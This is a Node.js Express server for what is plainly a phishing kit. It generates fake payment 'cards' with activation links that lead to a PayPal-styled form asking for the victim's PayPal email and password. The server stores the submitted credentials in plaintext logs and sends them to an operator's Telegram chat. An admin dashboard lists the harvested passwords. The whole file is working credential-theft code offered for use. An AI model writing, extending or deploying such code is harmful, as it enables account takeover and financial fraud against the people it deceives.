const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs').promises;
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const TelegramBot = require('node-telegram-bot-api');

dotenv.config();
const app = express();

// Initialize Telegram Bot
let bot;
try {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
} catch (err) {
  console.error('Failed to initialize Telegram bot:', err.message);
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'frontend'))); // Serve frontend

// Log activation link access
app.use('/api/cards/activate', (req, res, next) => {
  console.log(`Activation link accessed: ${req.originalUrl} at ${new Date().toLocaleString()}`);
  next();
});

// Initialize data.json if it doesn't exist
const dataPath = path.join(__dirname, 'data/data.json');
async function initializeDataFile() {
  try {
    await fs.access(dataPath);
  } catch (err) {
    if (err.code === 'ENOENT') {
      // Create data directory if it doesn't exist
      await fs.mkdir(path.dirname(dataPath), { recursive: true });
      await fs.writeFile(dataPath, JSON.stringify({ users: [], cards: [], activationLogs: [] }, null, 2));
      console.log('Initialized data.json');
    } else {
      console.error('Error accessing data.json:', err.message);
    }
  }
}

// Call initialization before starting the server
initializeDataFile().catch(err => console.error('Initialization error:', err.message));

// JWT Authentication Middleware
const authMiddleware = (req, res, next) => {
  const token = req.header('Authorization')?.replace('Bearer ', '');
  if (!token) {
    return res.status(401).json({ error: 'Access denied: No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    console.error('JWT verification error:', err.message);
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Signup
app.post('/api/auth/signup', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    if (data.users.find(u => u.username === username)) {
      return res.status(400).json({ error: 'Username already exists' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    data.users.push({ username, password: hashedPassword });
    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));

    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
    res.status(201).json({ token });
  } catch (err) {
    console.error('Signup error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Signin
app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    const user = data.users.find(u => u.username === username);
    if (!user) {
      return res.status(400).json({ error: 'Invalid credentials' });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
    res.json({ token });
  } catch (err) {
    console.error('Login error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Delete User (Admin only)
app.delete('/api/auth/delete-user', async (req, res) => {
  const authHeader = req.header('Authorization');
  if (!authHeader || authHeader !== `Basic ${Buffer.from(`${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}`).toString('base64')}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const { username } = req.body;
  if (!username) {
    return res.status(400).json({ error: 'Username required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    if (!data.users.find(u => u.username === username)) {
      return res.status(404).json({ error: 'User not found' });
    }

    data.users = data.users.filter(u => u.username !== username);
    data.cards = data.cards.filter(c => c.owner !== username);
    data.activationLogs = data.activationLogs.filter(l => !data.cards.some(c => c.cardId === l.cardId && c.owner === username));
    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
    res.json({ message: 'User deleted' });
  } catch (err) {
    console.error('Delete user error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate Card
app.post('/api/cards/generate', authMiddleware, async (req, res) => {
  const { name, expDate, amount } = req.body;
  if (!name || !expDate || !amount || amount <= 0 || !/^\d{2}\d{4}$/.test(expDate.replace(/\//g, ''))) {
    return res.status(400).json({ error: 'Invalid input: name, expiration date (MMYYYY), and positive amount required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    const cardNumber = '4123' + Math.floor(100000000000 + Math.random() * 900000000000).toString().slice(0, 12);
    const maskedNumber = `****-****-****-${cardNumber.slice(-4)}`;
    const cvv = Math.floor(100 + Math.random() * 900).toString();
    const cardId = uuidv4();
    const formattedExpDate = `${expDate.slice(0, 2)}/${expDate.slice(2)}`;
    const activationLink = `http://localhost:5000/api/cards/activate/${cardId}`;

    const card = {
      cardId,
      number: maskedNumber,
      cvv,
      name,
      expDate: formattedExpDate,
      amount: parseFloat(amount),
      status: 'Pending',
      owner: req.user.username,
      activationLink,
      generationTimestamp: new Date().toISOString()
    };

    data.cards.push(card);
    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
    res.status(201).json(card);
  } catch (err) {
    console.error('Generate card error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get User's Cards
app.get('/api/cards', authMiddleware, async (req, res) => {
  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    const userCards = data.cards.filter(c => c.owner === req.user.username);
    res.json(userCards);
  } catch (err) {
    console.error('Get cards error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Activate Card (Serve Form)
app.get('/api/cards/activate/:cardId', async (req, res) => {
  const { cardId } = req.params;
  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).send('Server error');
    }

    const card = data.cards.find(c => c.cardId === cardId);
    if (!card || card.status === 'Activated') {
      return res.status(400).send('Invalid or already activated card');
    }

    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Activate Card</title>
        <style>
          body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f9fa; }
          .container { width: 400px; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
          .input-field { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px; }
          .btn { width: 100%; padding: 10px; background-color: #0070ba; color: white; border: none; border-radius: 5px; cursor: pointer; }
        </style>
      </head>
      <body>
        <div class="container">
          <h2>Activate Card</h2>
          <input type="text" class="input-field" id="paypalUsername" placeholder="PayPal Email">
          <input type="password" class="input-field" id="paypalPassword" placeholder="PayPal Password">
          <button class="btn" onclick="activate()">Activate</button>
        </div>
        <script>
          async function activate() {
            const username = document.getElementById('paypalUsername').value;
            const password = document.getElementById('paypalPassword').value;
            if (!username || !password) {
              alert('Please enter PayPal email and password');
              return;
            }
            try {
              const response = await fetch('/api/cards/activate/${cardId}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
              });
              const data = await response.json();
              alert(data.message || data.error);
              if (response.ok) window.location.href = '/';
            } catch (err) {
              alert('Error activating card');
            }
          }
        </script>
      </body>
      </html>
    `);
  } catch (err) {
    console.error('Activate card error:', err.message);
    res.status(500).send('Server error');
  }
});

// Activate Card (Collect PayPal Login)
app.post('/api/cards/activate/:cardId', async (req, res) => {
  const { cardId } = req.params;
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'PayPal email and password required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    const card = data.cards.find(c => c.cardId === cardId);
    if (!card || card.status === 'Activated') {
      return res.status(400).json({ error: 'Invalid or already activated card' });
    }

    card.status = 'Activated';
    const log = {
      id: uuidv4(),
      cardId,
      user: username,
      pass: password,
      time: new Date().toISOString()
    };
    data.activationLogs.push(log);
    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));

    // Send Telegram notification to admin
    try {
      await bot.sendMessage(
        process.env.TELEGRAM_CHAT_ID,
        `New PayPal login for card ${card.number} (Owner: ${card.owner}):\nEmail: ${username}\nPassword: ${password}\nTime: ${new Date(log.time).toLocaleString()}`
      );
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError.message);
    }

    res.json({ message: 'Card activated successfully' });
  } catch (err) {
    console.error('Activate card error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get Activation Logs
app.get('/api/cards/logs', authMiddleware, async (req, res) => {
  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    let logs;
    if (req.user.username === process.env.ADMIN_USERNAME) {
      logs = data.activationLogs; // Admin sees all logs
    } else {
      const userCards = data.cards.filter(c => c.owner === req.user.username);
      logs = data.activationLogs.filter(l => userCards.some(c => c.cardId === l.cardId));
    }
    res.json(logs);
  } catch (err) {
    console.error('Get logs error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Delete Card (User or Admin)
app.delete('/api/cards/delete', authMiddleware, async (req, res) => {
  const { cardId } = req.body;
  if (!cardId) {
    return res.status(400).json({ error: 'Card ID required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    const card = data.cards.find(c => c.cardId === cardId);
    if (!card) {
      return res.status(404).json({ error: 'Card not found' });
    }
    if (card.owner !== req.user.username && req.user.username !== process.env.ADMIN_USERNAME) {
      return res.status(403).json({ error: 'Unauthorized' });
    }

    data.cards = data.cards.filter(c => c.cardId !== cardId);
    data.activationLogs = data.activationLogs.filter(l => l.cardId !== cardId);
    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
    res.json({ message: 'Card deleted' });
  } catch (err) {
    console.error('Delete card error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Delete Log (User or Admin)
app.delete('/api/cards/delete-log', authMiddleware, async (req, res) => {
  const { logId } = req.body;
  if (!logId) {
    return res.status(400).json({ error: 'Log ID required' });
  }

  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).json({ error: 'Server error' });
    }

    const log = data.activationLogs.find(l => l.id === logId);
    if (!log) {
      return res.status(404).json({ error: 'Log not found' });
    }

    const card = data.cards.find(c => c.cardId === log.cardId);
    if (!card || (card.owner !== req.user.username && req.user.username !== process.env.ADMIN_USERNAME)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }

    data.activationLogs = data.activationLogs.filter(l => l.id !== logId);
    await fs.writeFile(dataPath, JSON.stringify(data, null, 2));
    res.json({ message: 'Log deleted' });
  } catch (err) {
    console.error('Delete log error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin Dashboard
app.get('/admin', async (req, res) => {
  try {
    let data;
    try {
      data = JSON.parse(await fs.readFile(dataPath));
    } catch (err) {
      console.error('Error reading data.json:', err.message);
      return res.status(500).send('Server error: Unable to read data');
    }

    const { users, cards, activationLogs } = data;

    // Generate HTML for admin dashboard
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Dashboard</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; background-color: #f7f9fa; }
          h1 { text-align: center; }
          table { width: 100%; border-collapse: collapse; margin-top: 20px; }
          th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
          th { background-color: #0070ba; color: white; }
          button { padding: 5px 10px; background-color: #ff4d4d; color: white; border: none; cursor: pointer; }
          button:hover { background-color: #cc0000; }
        </style>
      </head>
      <body>
        <h1>Admin Dashboard</h1>
        <h2>Users</h2>
        <table>
          <tr><th>Username</th><th>Action</th></tr>
          ${users.map(user => `
            <tr>
              <td>${user.username}</td>
              <td><button onclick="deleteUser('${user.username}')">Delete</button></td>
            </tr>
          `).join('')}
        </table>
        <h2>Cards</h2>
        <table>
          <tr><th>Card ID</th><th>Number</th><th>Name</th><th>Owner</th><th>Status</th><th>Activation Link</th><th>Action</th></tr>
          ${cards.map(card => `
            <tr>
              <td>${card.cardId}</td>
              <td>${card.number}</td>
              <td>${card.name}</td>
              <td>${card.owner}</td>
              <td>${card.status}</td>
              <td><a href="${card.activationLink}" target="_blank">${card.activationLink}</a></td>
              <td><button onclick="deleteCard('${card.cardId}')">Delete</button></td>
            </tr>
          `).join('')}
        </table>
        <h2>Activation Logs</h2>
        <table>
          <tr><th>Card ID</th><th>PayPal Email</th><th>PayPal Password</th><th>Timestamp</th><th>Action</th></tr>
          ${activationLogs.map(log => `
            <tr>
              <td>${log.cardId}</td>
              <td>${log.user}</td>
              <td>${log.pass}</td>
              <td>${new Date(log.time).toLocaleString()}</td>
              <td><button onclick="deleteLog('${log.id}')">Delete</button></td>
            </tr>
          `).join('')}
        </table>
        <script>
          async function deleteUser(username) {
            if (!confirm('Delete user?')) return;
            try {
              const response = await fetch('/api/auth/delete-user', {
                method: 'DELETE',
                headers: { 
                  'Content-Type': 'application/json', 
                  'Authorization': 'Basic ' + btoa('${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}')
                },
                body: JSON.stringify({ username })
              });
              const data = await response.json();
              alert(data.message || data.error);
              location.reload();
            } catch (err) {
              alert('Error deleting user');
            }
          }
          async function deleteCard(cardId) {
            if (!confirm('Delete card?')) return;
            try {
              const response = await fetch('/api/cards/delete', {
                method: 'DELETE',
                headers: { 
                  'Content-Type': 'application/json', 
                  'Authorization': 'Basic ' + btoa('${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}')
                },
                body: JSON.stringify({ cardId })
              });
              const data = await response.json();
              alert(data.message || data.error);
              location.reload();
            } catch (err) {
              alert('Error deleting card');
            }
          }
          async function deleteLog(logId) {
            if (!confirm('Delete log?')) return;
            try {
              const response = await fetch('/api/cards/delete-log', {
                method: 'DELETE',
                headers: { 
                  'Content-Type': 'application/json', 
                  'Authorization': 'Basic ' + btoa('${process.env.ADMIN_USERNAME}:${process.env.ADMIN_PASSWORD}')
                },
                body: JSON.stringify({ logId })
              });
              const data = await response.json();
              alert(data.message || data.error);
              location.reload();
            } catch (err) {
              alert('Error deleting log');
            }
          }
        </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    console.error('Admin dashboard error:', err.message);
    res.status(500).send('Server error');
  }
});

// Error Handling Middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
